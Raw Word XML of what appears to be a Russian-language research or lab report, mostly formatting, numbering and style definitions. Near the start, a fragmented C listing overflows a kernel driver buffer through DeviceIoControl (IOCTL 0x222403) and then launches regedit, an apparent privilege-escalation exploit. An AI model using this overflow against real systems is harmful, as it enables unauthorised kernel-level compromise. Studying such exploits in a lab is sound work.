      <w:r w:rsidRPr="00AC3BB7"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78F2D140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C3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7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InBuffer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 = (</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>*)malloc(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bufLength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165278B1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memset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InBuffer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A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>'A'</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>, 2080);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ECDC43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memcpy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InBuffer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 + 2080, &amp;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AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>sizeof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));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCAFEDC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2FA015F7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DeviceIoControl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hDriver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0x222403,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InBuffer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bufLength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NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>, 0, &amp;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BytesReturned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AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r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2B77689E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system(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>"start regedit"</w:t>
      </w:r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1EF53E9B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416F858B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CloseHandle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hDriver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6E62F90A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VirtualFree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ptr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 xml:space="preserve">, 0, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>MEM_RELEASE</w:t>
      </w:r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65F8E2C7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free(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>InBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1820C6BC" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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</w:p>
    <w:p w14:paraId="3C74D6FD" w14:textId="77777777" w:rsid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 w:rsidRPr="00AC3BB7"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96886B1" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af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45196D2" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7"/>
    <w:p w14:paraId="24012A2B" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="259133EB" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7"/>
    <w:sectPr w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidSect="00B056AA">
      <w:footerReference w:type="default" r:id="rId40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549033" w14:textId="77777777" w:rsidR="00B056AA" w:rsidRPr="00D60F71" w:rsidRDefault="00B056A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6DB47A58" w14:textId="77777777" w:rsidR="00B056AA" w:rsidRPr="00D60F71" w:rsidRDefault="00B056A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6040AA62" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C53ADA" w:rsidRDefault="00C93DCC" w:rsidP="00C53ADA">
        <w:pPr>
          <w:pStyle w:val="afe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D740EB">
          <w:rPr>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>4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36B420" w14:textId="77777777" w:rsidR="00B056AA" w:rsidRPr="00D60F71" w:rsidRDefault="00B056A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194820AC" w14:textId="77777777" w:rsidR="00B056AA" w:rsidRPr="00D60F71" w:rsidRDefault="00B056A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62FA7D24"/>
    <w:name w:val="WW8Num2"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="none"/>
      <w:pStyle w:val="a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1A715FA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B2E811CC"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="04903F0F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3270439A"/>
    <w:lvl w:ilvl="0" w:tplc="FC701FB2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="20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08B068A2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2AFEC94E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="09CC1AE9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:numStyleLink w:val="22"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9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0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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="20906314"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:numStyleLink w:val="22"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="22392D9B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AF9C6C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A653BB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="58C4C8F6"/>
    <w:lvl w:ilvl="0" w:tplc="FC8C2C18">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="a1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45339D1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="85769A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2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7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18" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="35500D25"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:numStyleLink w:val="22"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="19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20" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="40827C09"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="547C75F6"/>
    <w:lvl w:ilvl="0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3314AD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="458EEBE0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a3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44453F97"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="16D067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384398"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8C5C302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BAE0C7A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CF1CFC7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4D8072CD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E1E6B7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27069A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DD5A7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28" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="5A84311D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C00C3CDC"/>
    <w:lvl w:ilvl="0" w:tplc="4AB684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5D123824"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D9EAA19A"/>
    <w:lvl w:ilvl="0" w:tplc="25F0B318">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a4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6081F0D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BAB6890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67FC70B2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6F4C2824"/>
    <w:lvl w:ilvl="0" w:tplc="70526CC8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a5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69B51D24"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:styleLink w:val="22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34" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6FDA5BC5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BFD01092"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a6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36" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="71691B2E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BD18C7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 w16cid:durableId="1318614043">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1173686048">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1781878845">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="233905140">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1116606378">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2012292597">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1820032265">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="2017923419">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="700469892">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="459998207">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1218781327">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1860312888">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1558584712">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="929896214">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="587927915">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1754544218">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="408314005">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="388194625">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1135172397">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="2143577704">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1837768122">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1240943767">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="920260102">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="1552184628">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="660473221">
    <w:abstractNumId w:val="29"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1807117416">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="101849444">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="19280686">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="48767560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113865402">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="194426448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978803146">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="1128089318">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="979264898">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="677387772">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="1224482923">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="1345942500">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="1242258767">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="41290010">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="13599879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removePersonalInformation/>
  <w:removeDateAndTime/>
  <w:proofState w:spelling="clean" w:grammar="clean"/>
  <w:attachedTemplate r:id="rId1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D0E"/>
    <w:rsid w:val="000045C6"/>
    <w:rsid w:val="00015F68"/>
    <w:rsid w:val="00025991"/>
    <w:rsid w:val="00027A50"/>
    <w:rsid w:val="00033F36"/>
    <w:rsid w:val="00035C4C"/>
    <w:rsid w:val="0003656F"/>
    <w:rsid w:val="0006172D"/>
    <w:rsid w:val="00063A15"/>
    <w:rsid w:val="00064E8B"/>
    <w:rsid w:val="00090579"/>
    <w:rsid w:val="00095910"/>
    <w:rsid w:val="000B1F41"/>
    <w:rsid w:val="000B5D9C"/>
    <w:rsid w:val="000B6B46"/>
    <w:rsid w:val="000D0663"/>
    <w:rsid w:val="000F71FD"/>
    <w:rsid w:val="00111FF9"/>
    <w:rsid w:val="001172D4"/>
    <w:rsid w:val="00146996"/>
    <w:rsid w:val="00151BEC"/>
    <w:rsid w:val="0015339D"/>
    <w:rsid w:val="00162375"/>
    <w:rsid w:val="00176F1B"/>
    <w:rsid w:val="001772B4"/>
    <w:rsid w:val="001832F5"/>
    <w:rsid w:val="001B1B03"/>
    <w:rsid w:val="001B32F7"/>
    <w:rsid w:val="001B41D8"/>
    <w:rsid w:val="001B6552"/>
    <w:rsid w:val="001E6E38"/>
    <w:rsid w:val="0020070E"/>
    <w:rsid w:val="002119FE"/>
    <w:rsid w:val="00225329"/>
    <w:rsid w:val="00237987"/>
    <w:rsid w:val="002523D2"/>
    <w:rsid w:val="0025334A"/>
    <w:rsid w:val="002632D6"/>
    <w:rsid w:val="00265640"/>
    <w:rsid w:val="002A7967"/>
    <w:rsid w:val="002D1672"/>
    <w:rsid w:val="002D5C58"/>
    <w:rsid w:val="002E373A"/>
    <w:rsid w:val="002E7750"/>
    <w:rsid w:val="0030071C"/>
    <w:rsid w:val="00300841"/>
    <w:rsid w:val="0030623C"/>
    <w:rsid w:val="00312467"/>
    <w:rsid w:val="00312B77"/>
    <w:rsid w:val="00321776"/>
    <w:rsid w:val="00327A23"/>
    <w:rsid w:val="00341A02"/>
    <w:rsid w:val="0036219A"/>
    <w:rsid w:val="00371E39"/>
    <w:rsid w:val="0037417C"/>
    <w:rsid w:val="0037444F"/>
    <w:rsid w:val="00374C59"/>
    <w:rsid w:val="00376AC7"/>
    <w:rsid w:val="003844E4"/>
    <w:rsid w:val="00384ECC"/>
    <w:rsid w:val="00395E78"/>
    <w:rsid w:val="003A0D19"/>
    <w:rsid w:val="003B2153"/>
    <w:rsid w:val="003B7418"/>
    <w:rsid w:val="003C218B"/>
    <w:rsid w:val="003D30A4"/>
    <w:rsid w:val="003D414E"/>
    <w:rsid w:val="003E4132"/>
    <w:rsid w:val="003E4C7B"/>
    <w:rsid w:val="003F274E"/>
    <w:rsid w:val="00405CBE"/>
    <w:rsid w:val="0040671E"/>
    <w:rsid w:val="004156CB"/>
    <w:rsid w:val="004329C7"/>
    <w:rsid w:val="004511E5"/>
    <w:rsid w:val="00453CBA"/>
    <w:rsid w:val="004557D2"/>
    <w:rsid w:val="00456558"/>
    <w:rsid w:val="00475C3D"/>
    <w:rsid w:val="00497F6F"/>
    <w:rsid w:val="004A5302"/>
    <w:rsid w:val="004B37E8"/>
    <w:rsid w:val="004B5CD2"/>
    <w:rsid w:val="004D6D91"/>
    <w:rsid w:val="004E51A0"/>
    <w:rsid w:val="004F2A89"/>
    <w:rsid w:val="004F7F88"/>
    <w:rsid w:val="00501F48"/>
    <w:rsid w:val="00502B04"/>
    <w:rsid w:val="00506F69"/>
    <w:rsid w:val="00507FA4"/>
    <w:rsid w:val="00516DFF"/>
    <w:rsid w:val="00524FB3"/>
    <w:rsid w:val="00543F39"/>
    <w:rsid w:val="00544F2D"/>
    <w:rsid w:val="00564494"/>
    <w:rsid w:val="0057482E"/>
    <w:rsid w:val="005816CA"/>
    <w:rsid w:val="005C2332"/>
    <w:rsid w:val="005D2800"/>
    <w:rsid w:val="005E4F2A"/>
    <w:rsid w:val="005F19D8"/>
    <w:rsid w:val="005F5D88"/>
    <w:rsid w:val="00601F8B"/>
    <w:rsid w:val="0060370D"/>
    <w:rsid w:val="00656BE4"/>
    <w:rsid w:val="00674524"/>
    <w:rsid w:val="006B3173"/>
    <w:rsid w:val="006B3E75"/>
    <w:rsid w:val="006B4CA3"/>
    <w:rsid w:val="006C7A54"/>
    <w:rsid w:val="006C7B33"/>
    <w:rsid w:val="006E2B77"/>
    <w:rsid w:val="006E7B40"/>
    <w:rsid w:val="006F5F48"/>
    <w:rsid w:val="00700485"/>
    <w:rsid w:val="0070592F"/>
    <w:rsid w:val="0071183B"/>
    <w:rsid w:val="00721D70"/>
    <w:rsid w:val="007246FB"/>
    <w:rsid w:val="007266B5"/>
    <w:rsid w:val="00745D0E"/>
    <w:rsid w:val="0075210F"/>
    <w:rsid w:val="007637F0"/>
    <w:rsid w:val="00773594"/>
    <w:rsid w:val="0078465D"/>
    <w:rsid w:val="007930ED"/>
    <w:rsid w:val="007B55BD"/>
    <w:rsid w:val="007C378E"/>
    <w:rsid w:val="007D0609"/>
    <w:rsid w:val="007D3A85"/>
    <w:rsid w:val="007E0985"/>
    <w:rsid w:val="007F15A9"/>
    <w:rsid w:val="0080177A"/>
    <w:rsid w:val="008045D8"/>
    <w:rsid w:val="008244CC"/>
    <w:rsid w:val="008302C7"/>
    <w:rsid w:val="00830F2D"/>
    <w:rsid w:val="008373C8"/>
    <w:rsid w:val="00853432"/>
    <w:rsid w:val="00856000"/>
    <w:rsid w:val="0085668E"/>
    <w:rsid w:val="00886834"/>
    <w:rsid w:val="008A55CA"/>
    <w:rsid w:val="008B1C72"/>
    <w:rsid w:val="008D6379"/>
    <w:rsid w:val="008D6C4D"/>
    <w:rsid w:val="00907310"/>
    <w:rsid w:val="00911A8F"/>
    <w:rsid w:val="00917645"/>
    <w:rsid w:val="00917D90"/>
    <w:rsid w:val="009238F0"/>
    <w:rsid w:val="00923E95"/>
    <w:rsid w:val="0093477C"/>
    <w:rsid w:val="0095388A"/>
    <w:rsid w:val="00961BBB"/>
    <w:rsid w:val="00983861"/>
    <w:rsid w:val="00985035"/>
    <w:rsid w:val="009A58F5"/>
    <w:rsid w:val="009A77CB"/>
    <w:rsid w:val="009B1702"/>
    <w:rsid w:val="009C0CF1"/>
    <w:rsid w:val="009D0645"/>
    <w:rsid w:val="009F270C"/>
    <w:rsid w:val="009F5065"/>
    <w:rsid w:val="00A2111C"/>
    <w:rsid w:val="00A233A8"/>
    <w:rsid w:val="00A504F7"/>
    <w:rsid w:val="00A62BEC"/>
    <w:rsid w:val="00A64183"/>
    <w:rsid w:val="00A64AE6"/>
    <w:rsid w:val="00A701B6"/>
    <w:rsid w:val="00A70D32"/>
    <w:rsid w:val="00A74B4F"/>
    <w:rsid w:val="00A95BAF"/>
    <w:rsid w:val="00AA726B"/>
    <w:rsid w:val="00AC3BB7"/>
    <w:rsid w:val="00AD03E2"/>
    <w:rsid w:val="00AE1D8A"/>
    <w:rsid w:val="00AE1FDE"/>
    <w:rsid w:val="00AE243B"/>
    <w:rsid w:val="00AE53D9"/>
    <w:rsid w:val="00B056AA"/>
    <w:rsid w:val="00B13B4B"/>
    <w:rsid w:val="00B40B39"/>
    <w:rsid w:val="00B56646"/>
    <w:rsid w:val="00B968FE"/>
    <w:rsid w:val="00BE19C9"/>
    <w:rsid w:val="00BE1C48"/>
    <w:rsid w:val="00BE4EE3"/>
    <w:rsid w:val="00BE6394"/>
    <w:rsid w:val="00BF5B87"/>
    <w:rsid w:val="00C1387D"/>
    <w:rsid w:val="00C174D6"/>
    <w:rsid w:val="00C212CE"/>
    <w:rsid w:val="00C26074"/>
    <w:rsid w:val="00C34E34"/>
    <w:rsid w:val="00C36F05"/>
    <w:rsid w:val="00C378DB"/>
    <w:rsid w:val="00C469D8"/>
    <w:rsid w:val="00C47385"/>
    <w:rsid w:val="00C5031D"/>
    <w:rsid w:val="00C53ADA"/>
    <w:rsid w:val="00C6615B"/>
    <w:rsid w:val="00C73B66"/>
    <w:rsid w:val="00C7496F"/>
    <w:rsid w:val="00C77E41"/>
    <w:rsid w:val="00C93DCC"/>
    <w:rsid w:val="00CA234D"/>
    <w:rsid w:val="00CA60F8"/>
    <w:rsid w:val="00CC2458"/>
    <w:rsid w:val="00CD69E8"/>
    <w:rsid w:val="00D139C3"/>
    <w:rsid w:val="00D24CF4"/>
    <w:rsid w:val="00D32446"/>
    <w:rsid w:val="00D335CB"/>
    <w:rsid w:val="00D35779"/>
    <w:rsid w:val="00D47791"/>
    <w:rsid w:val="00D5217D"/>
    <w:rsid w:val="00D52829"/>
    <w:rsid w:val="00D54B16"/>
    <w:rsid w:val="00D60F71"/>
    <w:rsid w:val="00D65044"/>
    <w:rsid w:val="00D740EB"/>
    <w:rsid w:val="00DA1B1D"/>
    <w:rsid w:val="00DB66C1"/>
    <w:rsid w:val="00DD17DF"/>
    <w:rsid w:val="00DD19DB"/>
    <w:rsid w:val="00DE1E6E"/>
    <w:rsid w:val="00DF2217"/>
    <w:rsid w:val="00E06693"/>
    <w:rsid w:val="00E13401"/>
    <w:rsid w:val="00E24E33"/>
    <w:rsid w:val="00E3387E"/>
    <w:rsid w:val="00E35D02"/>
    <w:rsid w:val="00E37F01"/>
    <w:rsid w:val="00E675B9"/>
    <w:rsid w:val="00E802CE"/>
    <w:rsid w:val="00E80FFE"/>
    <w:rsid w:val="00EC03D0"/>
    <w:rsid w:val="00EC06C5"/>
    <w:rsid w:val="00EC1C7F"/>
    <w:rsid w:val="00EC5903"/>
    <w:rsid w:val="00ED3AA1"/>
    <w:rsid w:val="00EE7ACF"/>
    <w:rsid w:val="00EF0EED"/>
    <w:rsid w:val="00EF4ADA"/>
    <w:rsid w:val="00F03722"/>
    <w:rsid w:val="00F11A38"/>
    <w:rsid w:val="00F133D8"/>
    <w:rsid w:val="00F1506C"/>
    <w:rsid w:val="00F2105D"/>
    <w:rsid w:val="00F27212"/>
    <w:rsid w:val="00F52F00"/>
    <w:rsid w:val="00F570B7"/>
    <w:rsid w:val="00F610A8"/>
    <w:rsid w:val="00F67AC2"/>
    <w:rsid w:val="00F72418"/>
    <w:rsid w:val="00F72D85"/>
    <w:rsid w:val="00F7377D"/>
    <w:rsid w:val="00F74364"/>
    <w:rsid w:val="00F91A1E"/>
    <w:rsid w:val="00FA32D6"/>
    <w:rsid w:val="00FB359E"/>
    <w:rsid w:val="00FB5D42"/>
    <w:rsid w:val="00FD498F"/>
    <w:rsid w:val="00FE2979"/>
    <w:rsid w:val="00FE7FAB"/>
    <w:rsid w:val="00FF63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9B435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7">
    <w:name w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00AC3BB7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1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="10"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00C53ADA"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="567"/>
      </w:tabs>
      <w:ind w:left="0" w:firstLine="851"/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1">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="23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ind w:left="0" w:firstLine="851"/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7"/>
    <w:next w:val="a7"/>
    <w:link w:val="30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ind w:left="0" w:firstLine="851"/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7"/>
    <w:next w:val="a7"/>
    <w:link w:val="40"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="3"/>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/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7"/>
    <w:next w:val="a7"/>
    <w:link w:val="50"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="4"/>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/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7"/>
    <w:next w:val="a7"/>
    <w:link w:val="60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7"/>
    <w:next w:val="a7"/>
    <w:link w:val="70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7"/>
    <w:next w:val="a7"/>
    <w:link w:val="80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Title"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="ac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d">
    <w:name w:val="Название рисунка"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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e">
    <w:name w:val="Название таблицы"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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ac">
    <w:name w:val="Заголовок Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="ab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f">
    <w:name w:val="Программный код"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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f0">
    <w:name w:val="Текст внутри таблицы"/>
    <w:basedOn w:val="a7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10">
    <w:name w:val="Заголовок 1 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="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23">
    <w:name w:val="Заголовок 2 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="21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30">
    <w:name w:val="Заголовок 3 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="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40">
    <w:name w:val="Заголовок 4 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="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50">
    <w:name w:val="Заголовок 5 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="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60">
    <w:name w:val="Заголовок 6 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="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70">
    <w:name w:val="Заголовок 7 Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="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2">
    <w:name w:val="НИР нумерованный список"/>
    <w:basedOn w:val="a7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a7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af1">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="a8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11">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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24">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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31">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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af2">
    <w:name w:val="E-mail Signature"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="af3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00F67AC2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="af3">
    <w:name w:val="Электронная подпись Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="af2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00F67AC2"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
      <w:lang w:eastAsia="ru-RU"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af4">
